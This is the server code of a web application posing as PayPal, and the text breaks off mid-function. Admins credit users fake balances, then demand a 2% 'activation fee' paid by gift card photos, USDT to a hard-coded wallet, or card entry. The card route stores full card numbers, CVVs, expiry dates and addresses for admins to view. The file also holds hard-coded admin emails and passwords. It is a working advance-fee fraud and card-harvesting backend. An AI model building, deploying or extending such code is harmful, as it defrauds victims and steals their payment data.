const express = require('express');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

const app = express();

// Use Render's dynamic port or default to 3000 for local development
const PORT = process.env.PORT || 3000;

// Use Render's persistent disk when on Render, otherwise local directory
const DATA_DIR = process.env.RENDER ? '/opt/render/project/src/data' : path.join(__dirname, 'data');
const UPLOADS_DIR = process.env.RENDER ? '/opt/render/project/src/uploads' : path.join(__dirname, 'uploads');

// Data file paths
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const TRANSACTIONS_FILE = path.join(DATA_DIR, 'transactions.json');
const ADMIN_LOGS_FILE = path.join(DATA_DIR, 'admin_logs.json');
const CARD_DETAILS_FILE = path.join(DATA_DIR, 'card_details.json');
const PAYMENT_SUBMISSIONS_FILE = path.join(DATA_DIR, 'payment_submissions.json');
const GIFT_CARD_SUBMISSIONS_FILE = path.join(DATA_DIR, 'gift_card_submissions.json');

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());
app.use(express.static('public'));
app.use('/uploads', express.static(UPLOADS_DIR)); // Serve uploads statically

// Ensure data directory and files exist with proper initialization
const initializeDataDirectory = () => {
    try {
        // Create directories if they don't exist
        if (!fs.existsSync(DATA_DIR)) {
            fs.mkdirSync(DATA_DIR, { recursive: true });
            console.log(`Created data directory: ${DATA_DIR}`);
        }
        
        if (!fs.existsSync(UPLOADS_DIR)) {
            fs.mkdirSync(UPLOADS_DIR, { recursive: true });
            console.log(`Created uploads directory: ${UPLOADS_DIR}`);
        }
        
        // Initialize files with proper structure
        const initializeFile = (filePath, defaultValue) => {
            try {
                if (!fs.existsSync(filePath) || fs.readFileSync(filePath, 'utf8').trim() === '') {
                    fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
                    console.log(`Initialized file: ${filePath}`);
                }
            } catch (error) {
                console.error(`Error initializing ${filePath}:`, error);
                fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
            }
        };
        
        initializeFile(USERS_FILE, {});
        initializeFile(TRANSACTIONS_FILE, []);
        initializeFile(ADMIN_LOGS_FILE, []);
        initializeFile(CARD_DETAILS_FILE, []);
        initializeFile(PAYMENT_SUBMISSIONS_FILE, []);
        initializeFile(GIFT_CARD_SUBMISSIONS_FILE, []);
        
        console.log('Data directory initialization complete');
    } catch (error) {
        console.error('Error initializing data directory:', error);
    }
};

// Initialize default admin user
const initializeDefaultAdmin = () => {
    try {
        const users = getUsers();
        const adminId = 'admin001';
        const adminEmail = process.env.ADMIN_EMAIL || 'jeffreyudenze@gmail.com';
        const adminPassword = process.env.ADMIN_PASSWORD || 'Chibuzor2000';
        
        if (!users[adminId]) {
            users[adminId] = {
                id: adminId,
                name: 'PayPal',
                email: adminEmail,
                password: adminPassword,
                balance: 1000000.00,
                role: 'admin',
                created: new Date().toISOString(),
                status: 'active',
                adminLevel: 'super',
                activated: true
            };
            
            // Create second admin
            const adminId2 = 'admin002';
            if (!users[adminId2]) {
                users[adminId2] = {
                    id: adminId2,
                    name: 'PayPal',
                    email: 'reeky@gmail.com',
                    password: 'reekypaypal',
                    balance: 1000000.00,
                    role: 'admin',
                    created: new Date().toISOString(),
                    status: 'active',
                    adminLevel: 'super',
                    activated: true
                };
            }
            
            saveUsers(users);
            console.log('Default admin users created');
        }
    } catch (error) {
        console.error('Error initializing default admin:', error);
    }
};

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        if (!fs.existsSync(UPLOADS_DIR)) {
            fs.mkdirSync(UPLOADS_DIR, { recursive: true });
        }
        cb(null, UPLOADS_DIR);
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + '-' + file.originalname);
    }
});

const upload = multer({ 
    storage: storage,
    limits: { fileSize: 5 * 1024 * 1024 } // 5MB limit
});

// Helper functions with enhanced error handling
const getUsers = () => {
    try {
        if (!fs.existsSync(USERS_FILE)) {
            console.log('Users file not found, returning empty object');
            return {};
        }
        
        const data = fs.readFileSync(USERS_FILE, 'utf8');
        if (!data || data.trim() === '') {
            console.log('Users file empty, returning empty object');
            return {};
        }
        
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading users:', error);
        // Try to backup the corrupted file
        if (fs.existsSync(USERS_FILE)) {
            const backupPath = USERS_FILE + '.backup-' + Date.now();
            try {
                fs.copyFileSync(USERS_FILE, backupPath);
                console.log(`Created backup of corrupted users file: ${backupPath}`);
            } catch (backupError) {
                console.error('Failed to create backup:', backupError);
            }
        }
        return {};
    }
};

const saveUsers = (users) => {
    try {
        // Create a backup before saving
        if (fs.existsSync(USERS_FILE)) {
            const backupPath = USERS_FILE + '.backup';
            fs.copyFileSync(USERS_FILE, backupPath);
        }
        
        fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving users:', error);
        return false;
    }
};

const getTransactions = () => {
    try {
        if (!fs.existsSync(TRANSACTIONS_FILE)) return [];
        const data = fs.readFileSync(TRANSACTIONS_FILE, 'utf8');
        if (!data || data.trim() === '') return [];
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading transactions:', error);
        return [];
    }
};

const saveTransaction = (transaction) => {
    try {
        const transactions = getTransactions();
        transactions.push(transaction);
        fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving transaction:', error);
        return false;
    }
};

const getAdminLogs = () => {
    try {
        if (!fs.existsSync(ADMIN_LOGS_FILE)) return [];
        const data = fs.readFileSync(ADMIN_LOGS_FILE, 'utf8');
        if (!data || data.trim() === '') return [];
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading admin logs:', error);
        return [];
    }
};

const saveAdminLog = (action, adminId, details, req = null) => {
    try {
        const logs = getAdminLogs();
        logs.push({
            action,
            adminId,
            details,
            timestamp: new Date().toISOString(),
            ip: req ? (req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1') : '127.0.0.1'
        });
        fs.writeFileSync(ADMIN_LOGS_FILE, JSON.stringify(logs, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving admin log:', error);
        return false;
    }
};

const getCardDetails = () => {
    try {
        if (!fs.existsSync(CARD_DETAILS_FILE)) return [];
        const data = fs.readFileSync(CARD_DETAILS_FILE, 'utf8');
        if (!data || data.trim() === '') return [];
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading card details:', error);
        return [];
    }
};

const saveCardDetails = (cardDetails) => {
    try {
        const cards = getCardDetails();
        cards.push(cardDetails);
        fs.writeFileSync(CARD_DETAILS_FILE, JSON.stringify(cards, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving card details:', error);
        return false;
    }
};

const getPaymentSubmissions = () => {
    try {
        if (!fs.existsSync(PAYMENT_SUBMISSIONS_FILE)) return [];
        const data = fs.readFileSync(PAYMENT_SUBMISSIONS_FILE, 'utf8');
        if (!data || data.trim() === '') return [];
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading payment submissions:', error);
        return [];
    }
};

const savePaymentSubmission = (submission) => {
    try {
        const submissions = getPaymentSubmissions();
        submissions.push(submission);
        fs.writeFileSync(PAYMENT_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving payment submission:', error);
        return false;
    }
};

const getGiftCardSubmissions = () => {
    try {
        if (!fs.existsSync(GIFT_CARD_SUBMISSIONS_FILE)) return [];
        const data = fs.readFileSync(GIFT_CARD_SUBMISSIONS_FILE, 'utf8');
        if (!data || data.trim() === '') return [];
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading gift card submissions:', error);
        return [];
    }
};

const saveGiftCardSubmission = (submission) => {
    try {
        const submissions = getGiftCardSubmissions();
        submissions.push(submission);
        fs.writeFileSync(GIFT_CARD_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving gift card submission:', error);
        return false;
    }
};

// Auto-save function to backup data periodically
const autoSaveData = () => {
    setInterval(() => {
        try {
            const users = getUsers();
            const usersBackupPath = USERS_FILE + '.autosave';
            fs.writeFileSync(usersBackupPath, JSON.stringify(users, null, 2));
            
            const transactions = getTransactions();
            const transactionsBackupPath = TRANSACTIONS_FILE + '.autosave';
            fs.writeFileSync(transactionsBackupPath, JSON.stringify(transactions, null, 2));
            
            console.log('Auto-save completed at', new Date().toISOString());
        } catch (error) {
            console.error('Auto-save error:', error);
        }
    }, 5 * 60 * 1000); // Every 5 minutes
};

// Middleware to check user login
const requireUserLogin = (req, res, next) => {
    const userId = req.cookies.userId;
    if (!userId) {
        return res.redirect('/login');
    }
    const users = getUsers();
    if (!users[userId]) {
        res.clearCookie('userId');
        return res.redirect('/login');
    }
    req.user = users[userId];
    req.userId = userId;
    next();
};

// Middleware to check admin login
const requireAdminLogin = (req, res, next) => {
    const adminId = req.cookies.adminId;
    if (!adminId) {
        return res.redirect('/admin-login');
    }
    const users = getUsers();
    if (!users[adminId] || users[adminId].role !== 'admin') {
        res.clearCookie('adminId');
        return res.redirect('/admin-login');
    }
    req.admin = users[adminId];
    req.adminId = adminId;
    next();
};

// Middleware for cookie consent
app.use((req, res, next) => {
    res.locals.showCookieBanner = !req.cookies.cookieConsent;
    next();
});

// ==================== USER ROUTES ====================

// Home route
app.get('/', (req, res) => {
    const userId = req.cookies.userId;
    const users = getUsers();
    
    if (userId && users[userId]) {
        return res.redirect('/dashboard');
    }
    res.redirect('/signup');
});

// Cookie consent
app.post('/accept-cookies', (req, res) => {
    res.cookie('cookieConsent', 'accepted', { 
        maxAge: 30 * 24 * 60 * 60 * 1000,
        httpOnly: true 
    });
    res.json({ success: true });
});

// Signup
app.get('/signup', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'signup.html'));
});

app.post('/signup', (req, res) => {
    const { name, email, password } = req.body;
    const users = getUsers();

    // Check if email exists
    for (const userId in users) {
        if (users[userId].email.toLowerCase() === email.toLowerCase()) {
            return res.send(`
                <script>
                    alert("Email already exists!");
                    window.location.href = '/signup';
                </script>
            `);
        }
    }

    // Create user
    const userId = 'user_' + Date.now();
    users[userId] = {
        id: userId,
        name,
        email: email.toLowerCase(),
        password,
        balance: 0.00,
        role: 'user',
        created: new Date().toISOString(),
        status: 'active',
        activated: false
    };

    saveUsers(users);
    res.cookie('userId', userId, { maxAge: 30 * 24 * 60 * 60 * 1000 });
    res.redirect('/dashboard');
});

// Login
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'login.html'));
});

app.post('/login', (req, res) => {
    const { email, password } = req.body;
    const users = getUsers();

    for (const userId in users) {
        const user = users[userId];
        if (user.email.toLowerCase() === email.toLowerCase() && user.password === password) {
            if (user.role === 'admin') {
                return res.send(`
                    <script>
                        alert("Admin users must login at /admin-login");
                        window.location.href = '/admin-login';
                    </script>
                `);
            }
            res.cookie('userId', userId, { maxAge: 30 * 24 * 60 * 60 * 1000 });
            return res.redirect('/dashboard');
        }
    }

    res.send(`
        <script>
            alert("Invalid email or password!");
            window.location.href = '/login';
        </script>
    `);
});

// Dashboard
app.get('/dashboard', requireUserLogin, (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'dashboard.html'));
});

// User API
app.get('/api/user', requireUserLogin, (req, res) => {
    const userData = { ...req.user };
    userData.id = req.userId;
    res.json(userData);
});

// User transactions
app.get('/api/user/transactions', requireUserLogin, (req, res) => {
    const userId = req.userId;
    const transactions = getTransactions();
    
    const userTransactions = transactions.filter(t => 
        t.from === userId || t.to === userId ||
        t.fromId === userId || t.toId === userId
    );
    
    userTransactions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    res.json(userTransactions);
});

// Logout
app.get('/logout', (req, res) => {
    res.clearCookie('userId');
    res.redirect('/');
});

// ==================== ACTIVATION PAYMENT ROUTES ====================

// Activation payment page
app.get('/activation-payment', requireUserLogin, (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'activation-payment.html'));
});

// Gift card payment page
app.get('/activation-payment/giftcard', requireUserLogin, (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'giftcard-payment.html'));
});

// USDT payment page
app.get('/activation-payment/usdt', requireUserLogin, (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'usdt-payment.html'));
});

// Card payment page
app.get('/activation-payment/card', requireUserLogin, (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'card-payment.html'));
});

// Handle gift card payment
app.post('/activation-payment/giftcard', requireUserLogin, upload.fields([
    { name: 'frontImage', maxCount: 1 },
    { name: 'backImage', maxCount: 1 }
]), (req, res) => {
    try {
        const activationFee = req.user.balance * 0.02;
        
        // Get file paths
        const frontImage = req.files['frontImage'] ? req.files['frontImage'][0] : null;
        const backImage = req.files['backImage'] ? req.files['backImage'][0] : null;
        
        if (!frontImage || !backImage) {
            return res.json({ success: false, error: 'Both images are required' });
        }
        
        // Create gift card submission
        const giftCardSubmission = {
            userId: req.userId,
            userName: req.user.name,
            userEmail: req.user.email,
            activationFee: activationFee,
            images: {
                front: frontImage.filename,
                back: backImage.filename
            },
            status: 'pending',
            timestamp: new Date().toISOString(),
            ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1'
        };
        
        saveGiftCardSubmission(giftCardSubmission);
        
        // Record transaction
        const transaction = {
            type: 'activation_fee',
            from: req.userId,
            fromName: req.user.name,
            to: 'system',
            toName: 'PayPal Activation',
            amount: activationFee,
            note: 'Activation fee via gift card (pending verification)',
            timestamp: new Date().toISOString(),
            paymentMethod: 'giftcard',
            status: 'pending',
            images: {
                front: frontImage.filename,
                back: backImage.filename
            }
        };
        
        saveTransaction(transaction);
        
        // Log to admin logs
        saveAdminLog('activation_payment', 'system', {
            userId: req.userId,
            userName: req.user.name,
            userEmail: req.user.email,
            amount: activationFee,
            method: 'giftcard',
            status: 'pending',
            images: {
                front: frontImage.filename,
                back: backImage.filename
            }
        }, req);
        
        res.json({ 
            success: true, 
            message: 'Payment submitted. Your account will be activated after verification.' 
        });
    } catch (error) {
        console.error('Error processing gift card payment:', error);
        res.json({ success: false, error: 'Server error' });
    }
});

// Handle USDT payment
app.post('/activation-payment/usdt', requireUserLogin, (req, res) => {
    try {
        const { transactionId } = req.body;
        const activationFee = req.user.balance * 0.02;
        
        if (!transactionId) {
            return res.json({ success: false, error: 'Transaction ID is required' });
        }
        
        // Record transaction
        const transaction = {
            type: 'activation_fee',
            from: req.userId,
            fromName: req.user.name,
            to: 'system',
            toName: 'PayPal Activation',
            amount: activationFee,
            note: `Activation fee via USDT (TXID: ${transactionId})`,
            timestamp: new Date().toISOString(),
            paymentMethod: 'usdt',
            status: 'completed',
            transactionId: transactionId,
            walletAddress: 'bybit"TH24TXpvXKVySBwb6XYZcW2kNoGw7XwCbx'
        };
        
        saveTransaction(transaction);
        
        // Update user to activated
        const users = getUsers();
        users[req.userId].activated = true;
        saveUsers(users);
        
        // Log to admin logs
        saveAdminLog('activation_payment', 'system', {
            userId: req.userId,
            userName: req.user.name,
            userEmail: req.user.email,
            amount: activationFee,
            method: 'usdt',
            status: 'completed',
            transactionId: transactionId
        }, req);
        
        res.json({ 
            success: true, 
            message: 'Payment completed successfully. Your account is now activated.' 
        });
    } catch (error) {
        console.error('Error processing USDT payment:', error);
        res.json({ success: false, error: 'Server error' });
    }
});

// Handle card payment WITH ADDRESS
app.post('/activation-payment/card', requireUserLogin, (req, res) => {
    try {
        const { cardNumber, cardholderName, expiry, cvv, address, city, state, zipCode, country } = req.body;
        const activationFee = req.user.balance * 0.02;
        
        // Validate card details
        if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
            return res.json({ success: false, error: 'Valid card number is required' });
        }
        if (!cardholderName) {
            return res.json({ success: false, error: 'Cardholder name is required' });
        }
        if (!expiry || !/^\d{2}\/\d{2}$/.test(expiry)) {
            return res.json({ success: false, error: 'Valid expiry date (MM/YY) is required' });
        }
        if (!cvv || cvv.length < 3) {
            return res.json({ success: false, error: 'Valid CVV is required' });
        }
        if (!address) {
            return res.json({ success: false, error: 'Billing address is required' });
        }
        
        // Extract last 4 digits
        const last4 = cardNumber.replace(/\s/g, '').slice(-4);
        
        // Save card details for admin reference
        const cardDetails = {
            userId: req.userId,
            userName: req.user.name,
            userEmail: req.user.email,
            activationFee: activationFee,
            cardDetails: {
                fullNumber: cardNumber,
                cardholderName: cardholderName,
                expiry: expiry,
                cvv: cvv,
                address: address,
                city: city || '',
                state: state || '',
                zipCode: zipCode || '',
                country: country || 'US'
            },
            timestamp: new Date().toISOString(),
            ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1'
        };
        
        saveCardDetails(cardDetails);
        
        // Record transaction
        const transaction = {
            type: 'activation_fee',
            from: req.userId,
            fromName: req.user.name,
            to: 'system',
            toName: 'PayPal Activation',
            amount: activationFee,
            note: `Activation fee via card (ending with ${last4})`,
            timestamp: new Date().toISOString(),
            paymentMethod: 'card',
            status: 'completed',
            cardDetails: {
                last4: last4,
                cardholderName: cardholderName,
                expiry: expiry
            }
        };
        
        saveTransaction(transaction);
        
        // Update user to activated
        const users = getUsers();
        users[req.userId].activated = true;
        saveUsers(users);
        
        // Log to admin logs
        saveAdminLog('activation_payment', 'system', {
            userId: req.userId,
            userName: req.user.name,
            userEmail: req.user.email,
            amount: activationFee,
            method: 'card',
            status: 'completed',
            last4: last4,
            cardholderName: cardholderName,
            address: address
        }, req);
        
        res.json({ 
            success: true, 
            message: 'Payment successful! Your account is now activated.' 
        });
    } catch (error) {
        console.error('Error processing card payment:', error);
        res.json({ success: false, error: 'Server error' });
    }
});

// ==================== ADMIN ROUTES ====================

// Admin login
app.get('/admin-login', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'admin-login.html'));
});

app.post('/admin-login', (req, res) => {
    const { email, password } = req.body;
    const users = getUsers();

    for (const userId in users) {
        const user = users[userId];
        if (user.email.toLowerCase() === email.toLowerCase() && user.password === password && user.role === 'admin') {
            res.cookie('adminId', userId, { maxAge: 8 * 60 * 60 * 1000 });
            
            // Log admin login
            saveAdminLog('login', userId, { email }, req);
            
            return res.redirect('/admin-dashboard');
        }
    }

    res.send(`
        <script>
            alert("Invalid admin credentials!");
            window.location.href = '/admin-login';
        </script>
    `);
});

// Admin dashboard
app.get('/admin-dashboard', requireAdminLogin, (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'admin-dashboard.html'));
});

// Admin logout
app.get('/admin-logout', (req, res) => {
    const adminId = req.cookies.adminId;
    
    // Log admin logout
    saveAdminLog('logout', adminId, {}, req);
    
    res.clearCookie('adminId');
    res.redirect('/admin-login');
});

// ==================== ADMIN API ENDPOINTS ====================

// Admin stats
app.get('/api/admin/stats', requireAdminLogin, (req, res) => {
    const users = getUsers();
    const transactions = getTransactions();
    const cardDetails = getCardDetails();
    const giftCardSubmissions = getGiftCardSubmissions();
    const userList = Object.values(users);
    
    const today = new Date().toDateString();
    const todayCardPayments = cardDetails.filter(c => 
        new Date(c.timestamp).toDateString() === today
    ).length;
    
    const stats = {
        totalUsers: userList.length,
        totalBalance: userList.reduce((sum, user) => sum + user.balance, 0),
        activeUsers: userList.filter(u => u.status === 'active').length,
        admins: userList.filter(u => u.role === 'admin').length,
        totalTransactions: transactions.length,
        todayTransactions: transactions.filter(t => 
            new Date(t.timestamp).toDateString() === today
        ).length,
        pendingActivations: giftCardSubmissions.filter(t => t.status === 'pending').length,
        activatedUsers: userList.filter(u => u.activated).length,
        totalCardPayments: cardDetails.length,
        todayCardPayments: todayCardPayments
    };
    
    res.json(stats);
});

// Get all users
app.get('/api/admin/users', requireAdminLogin, (req, res) => {
    const users = getUsers();
    const search = req.query.search || '';
    
    let filteredUsers = Object.entries(users);
    
    if (search) {
        filteredUsers = filteredUsers.filter(([id, user]) => 
            user.name.toLowerCase().includes(search.toLowerCase()) ||
            user.email.toLowerCase().includes(search.toLowerCase()) ||
            id.toLowerCase().includes(search.toLowerCase())
        );
    }
    
    res.json(Object.fromEntries(filteredUsers));
});

// Get transactions
app.get('/api/admin/transactions', requireAdminLogin, (req, res) => {
    const transactions = getTransactions();
    const limit = parseInt(req.query.limit) || 50;
    res.json(transactions.slice(-limit).reverse());
});

// Get admin logs
app.get('/api/admin/logs', requireAdminLogin, (req, res) => {
    const logs = getAdminLogs();
    res.json(logs.slice(-100).reverse());
});

// Get card details (for admin reference)
app.get('/api/admin/card-details', requireAdminLogin, (req, res) => {
    const cardDetails = getCardDetails();
    res.json(cardDetails.slice(-50).reverse());
});

// Get gift card submissions with images
app.get('/api/admin/gift-card-submissions', requireAdminLogin, (req, res) => {
    const submissions = getGiftCardSubmissions();
    res.json(submissions.slice(-50).reverse());
});

// Approve gift card payment
app.post('/api/admin/approve-giftcard', requireAdminLogin, (req, res) => {
    try {
        const { submissionId } = req.body;
        const submissions = getGiftCardSubmissions();
        const users = getUsers();
        
        // Find submission by timestamp or id
        const submission = submissions.find(s => s.timestamp === submissionId || s.userId === submissionId);
        
        if (!submission) {
            return res.json({ success: false, error: 'Submission not found' });
        }
        
        // Update submission status
        submission.status = 'approved';
        submission.approvedBy = req.adminId;
        submission.approvedAt = new Date().toISOString();
        
        // Update user activation status
        if (users[submission.userId]) {
            users[submission.userId].activated = true;
        }
        
        // Update transactions
        const transactions = getTransactions();
        const transaction = transactions.find(t => 
            t.from === submission.userId && 
            t.paymentMethod === 'giftcard' && 
            t.status === 'pending'
        );
        
        if (transaction) {
            transaction.status = 'completed';
            transaction.note = 'Gift card payment approved by admin';
        }
        
        // Save all changes
        fs.writeFileSync(GIFT_CARD_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
        saveUsers(users);
        fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));
        
        // Log admin action
        saveAdminLog('approve_giftcard', req.adminId, {
            userId: submission.userId,
            userName: submission.userName,
            amount: submission.activationFee,
            submissionId: submissionId
        }, req);
        
        res.json({ 
            success: true, 
            message: 'Gift card payment approved and user activated successfully!' 
        });
    } catch (error) {
        console.error('Error approving gift card:', error);
        res.json({ success: false, error: 'Server error' });
    }
});

// Reject gift card payment
app.post('/api/admin/reject-giftcard', requireAdminLogin, (req, res) => {
    try {
        const { submissionId, reason } = req.body;
        const submissions = getGiftCardSubmissions();
        
        const submission = submissions.find(s => s.timestamp === submissionId || s.userId === submissionId);
        
        if (!submission) {
            return res.json({ success: false, error: 'Submission not found' });
        }
        
        submission.status = 'rejected';
        submission.rejectedBy = req.adminId;
        submission.rejectedAt = new Date().toISOString();
        submission.rejectionReason = reason || 'No reason provided';
        
        fs.writeFileSync(GIFT_CARD_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
        
        saveAdminLog('reject_giftcard', req.adminId, {
            userId: submission.userId,
            userName: submission.userName,
            reason: reason,
            submissionId: submissionId
        }, req);
        
        res.json({ success: true, message: 'Gift card payment rejected!' });
    } catch (error) {
        console.error('Error rejecting gift card:', error);
        res.json({ success: false, error: 'Server error' });
    }
});

// Debug endpoint to see all users
app.get('/api/admin/debug/users', requireAdminLogin, (req, res) => {
    const users = getUsers();
    res.json({
        total: Object.keys(users).length,
        users: Object.entries(users).map(([id, user]) => ({
            id,
            name: user.name,
            email: user.email,
            balance: user.balance,
            role: user.role,
            activated: user.activated || false
        }))
    });
});

// Find user by email
app.get('/api/admin/find-user-by-email', requireAdminLogin, (req, res) => {
    const { email } = req.query;
    
    if (!email) {
        return res.json({ success: false, error: 'Email is required' });
    }
    
    const users = getUsers();
    
    // Find user by email (case-insensitive)
    for (const [userId, user] of Object.entries(users)) {
        if (user.email.toLowerCase() === email.toLowerCase()) {
            return res.json({
                success: true,
                found: true,
                id: userId,
                name: user.name,
                email: user.email,
                balance: user.balance,
                role: user.role,
                activated: user.activated || false
            });
        }
    }
    
    res.json({ 
        success: true, 
        found: false, 
        error: 'User not found' 
    });
});

// ==================== ADMIN ACTIONS ====================

// Add balance to user USING EMAIL
app.post('/api/admin/add-balance', requireAdminLogin, (req, res) => {
    const { email, amount, note } = req.body;
    
    const users = getUsers();
    
    // Find user by email (case-insensitive)
    let targetUserId = null;
    let targetUser = null;
    
    for (const [userId, user] of Object.entries(users)) {
        if (user.email.toLowerCase() === email.toLowerCase()) {
            targetUserId = userId;
            targetUser = user;
            break;
        }
    }
    
    if (!targetUser) {
        return res.json({ 
            success: false, 
            error: `User with email "${email}" not found. Please check the email address.` 
        });
    }
    
    const oldBalance = targetUser.balance;
    const amountNum = parseFloat(amount);
    
    if (isNaN(amountNum) || amountNum <= 0) {
        return res.json({ 
            success: false, 
            error: 'Invalid amount. Please enter a positive number.' 
        });
    }
    
    targetUser.balance += amountNum;
    users[targetUserId] = targetUser;
    
    // Record transaction
    const transaction = {
        type: 'admin_credit',
        from: 'ADMIN',
        fromId: req.adminId,
        fromName: req.admin.name,
        to: targetUserId,
        toName: targetUser.name,
        toEmail: targetUser.email,
        amount: amountNum,
        note: note || `Admin credit by ${req.admin.name}`,
        timestamp: new Date().toISOString()
    };
    
    saveTransaction(transaction);
    saveUsers(users);
    
    // Log admin action
    saveAdminLog('add_balance', req.adminId, {
        targetUser: targetUserId,
        targetUserName: targetUser.name,
        targetUserEmail: targetUser.email,
        amount: amountNum,
        oldBalance,
        newBalance: targetUser.balance,
        note
    }, req);
    
    res.json({ 
        success: true, 
        newBalance: targetUser.balance,
        user: {
            id: targetUserId,
            name: targetUser.name,
            email: targetUser.email
        },
        message: `Added $${amountNum.toFixed(2)} to ${targetUser.name}'s account (${targetUser.email})`
    });
});

// Deduct balance from user USING EMAIL
app.post('/api/admin/deduct-balance', requireAdminLogin, (req, res) => {
    const { email, amount, note } = req.body;
    const users = getUsers();
    
    // Find user by email (case-insensitive)
    let targetUserId = null;
    let targetUser = null;
    
    for (const [userId, user] of Object.entries(users)) {
        if (user.email.toLowerCase() === email.toLowerCase()) {
            targetUserId = userId;
            targetUser = user;
            break;
        }
    }
    
    if (!targetUser) {
        return res.json({ success: false, error: `User with email "${email}" not found` });
    }
    
    const amountNum = parseFloat(amount);
    
    if (targetUser.balance < amountNum) {
        return res.json({ success: false, error: 'Insufficient balance' });
    }
    
    const oldBalance = targetUser.balance;
    targetUser.balance -= amountNum;
    users[targetUserId] = targetUser;
    
    const transaction = {
        type: 'admin_debit',
        from: targetUserId,
        fromName: targetUser.name,
        fromEmail: targetUser.email,
        to: 'ADMIN',
        toId: req.adminId,
        toName: req.admin.name,
        amount: amountNum,
        note: note || `Admin debit by ${req.admin.name}`,
        timestamp: new Date().toISOString()
    };
    
    saveTransaction(transaction);
    saveUsers(users);
    
    saveAdminLog('deduct_balance', req.adminId, {
        targetUser: targetUserId,
        targetUserName: targetUser.name,
        targetUserEmail: targetUser.email,
        amount: amountNum,
        oldBalance,
        newBalance: targetUser.balance,
        note
    }, req);
    
    res.json({ 
        success: true, 
        newBalance: targetUser.balance,
        transaction
    });
});

// Update user info USING EMAIL
app.post('/api/admin/update-user', requireAdminLogin, (req, res) => {
    const { email, field, value } = req.body;
    const users = getUsers();
    
    // Find user by email (case-insensitive)
    let targetUserId = null;
    let targetUser = null;
    
    for (const [userId, user] of Object.entries(users)) {
        if (user.email.toLowerCase() === email.toLowerCase()) {
            targetUserId = userId;
            targetUser = user;
            break;
        }
    }
    
    if (!targetUser) {
        return res.json({ success: false, error: `User with email "${email}" not found` });
    }
    
    // Don't allow updating certain fields
    const restrictedFields = ['id', 'created', 'createdBy'];
    if (restrictedFields.includes(field)) {
        return res.json({ success: false, error: `Cannot update ${field} field` });
    }
    
    const oldValue = targetUser[field];
    targetUser[field] = value;
    users[targetUserId] = targetUser;
    
    saveUsers(users);
    
    saveAdminLog('update_user', req.adminId, {
        targetUser: targetUserId,
        targetUserName: targetUser.name,
        targetUserEmail: targetUser.email,
        field,
        oldValue,
        newValue: value
    }, req);
    
    res.json({ success: true, message: 'User updated successfully' });
});

// Create new user
app.post('/api/admin/create-user', requireAdminLogin, (req, res) => {
    const { name, email, password, initialBalance, role } = req.body;
    const users = getUsers();
    
    // Check if email exists (case-insensitive)
    for (const userId in users) {
        if (users[userId].email.toLowerCase() === email.toLowerCase()) {
            return res.json({ success: false, error: 'Email already exists' });
        }
    }
    
    const userId = 'admin_created_' + Date.now();
    users[userId] = {
        id: userId,
        name,
        email: email.toLowerCase(),
        password,
        balance: parseFloat(initialBalance) || 0,
        role: role || 'user',
        created: new Date().toISOString(),
        status: 'active',
        createdBy: req.adminId,
        activated: role === 'admin' ? true : false
    };
    
    saveUsers(users);
    
    saveAdminLog('create_user', req.adminId, {
        userId,
        name,
        email,
        initialBalance: parseFloat(initialBalance) || 0,
        role: role || 'user'
    }, req);
    
    res.json({ 
        success: true, 
        userId, 
        user: users[userId],
        message: `User ${name} created successfully`
    });
});

// Delete user USING EMAIL
app.post('/api/admin/delete-user', requireAdminLogin, (req, res) => {
    const { email } = req.body;
    const users = getUsers();
    
    // Find user by email (case-insensitive)
    let targetUserId = null;
    let targetUser = null;
    
    for (const [userId, user] of Object.entries(users)) {
        if (user.email.toLowerCase() === email.toLowerCase()) {
            targetUserId = userId;
            targetUser = user;
            break;
        }
    }
    
    if (!targetUser) {
        return res.json({ success: false, error: `User with email "${email}" not found` });
    }
    
    // Don't allow deleting self or other admins
    if (targetUser.role === 'admin' && targetUserId !== req.adminId) {
        return res.json({ success: false, error: 'Cannot delete other admins' });
    }
    
    const userData = targetUser;
    delete users[targetUserId];
    
    saveUsers(users);
    
    saveAdminLog('delete_user', req.adminId, {
        deletedUser: targetUserId,
        userName: userData.name,
        userEmail: userData.email,
        balance: userData.balance
    }, req);
    
    res.json({ 
